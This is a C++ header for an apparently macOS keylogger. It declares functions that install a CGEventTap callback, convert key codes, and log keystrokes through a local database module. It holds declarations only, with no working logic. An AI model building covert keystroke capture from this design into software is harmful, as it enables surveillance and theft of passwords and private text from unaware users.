#pragma once
#include "db/db.h"
#include <stdio.h>
#include <string.h>
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>

namespace KeyLogger {
    extern "C" {
        void Init();
        void Run();
        CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void*);
        const char *convertKeyCode(int);
    }
    void logKey(int keyCode);
    void logWorker();
};